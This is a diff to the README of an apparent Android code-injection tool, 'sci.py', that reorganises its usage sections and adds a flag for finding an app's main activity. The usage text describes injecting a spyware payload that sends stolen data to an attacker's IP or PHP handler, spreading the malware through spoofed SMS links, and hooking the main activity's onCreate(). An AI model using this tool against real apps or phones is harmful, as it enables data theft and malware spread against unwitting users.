@@ -29,9 +29,9 @@ A high level overview of the steps involved during code injection is:
 
 ## Usage
 ### Examples:
-Generic usage:
+#### Generic usage:
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -ppg [spoofed_SMS]
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -ppg [spoofed_SMS] -s
 		
 	[-a]: 	applicaion to modify.
 	[-t]: 	directory/file where to recursively perform the injection. If this argument is absent, the injection is performed within the whole app.
@@ -39,23 +39,16 @@ Generic usage:
 	[-p]: 	payload to inject. 
 	[-ppg]:	spoofed SMS content to send - **to propagate the malware** -.
 	[-rh]:  IP address of the attacker/script for sending the stolen data.
+	[-s]:	search for the main activity.
 
-Spyware usage:
+#### Spyware usage:
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -ppg [spoofed_SMS]
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -ppg [spoofed_SMS] 
     
 	[-ppg]:	link with the malicious app. 
 	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php - do not forget to change the settings to connect to your DB -).
 
 *Advice*: Inject the Spyware on the **onCreate()** method of the main activity.
-
-Logger usage:
-
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger
-
-*Note*: Connect your phone to your computer and use the following command to filter and print out only the modified app runtime method calls:
-
-		$ adb logcat | grep "::trace
 
 Identify the main activity - works with obfuscated apps -:
 
@@ -64,6 +57,14 @@ Identify the main activity - works with obfuscated apps -:
 Display the help menu:
 
 		$ python3 sci.py -h
+		
+#### Logger usage:
+
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger
+
+Connect your phone to your computer and use the following commands to filter and display the modified app runtime method calls:
+
+		$ adb logcat | grep "::trace
 
 ## Dependencies
 ### Third-party libraries
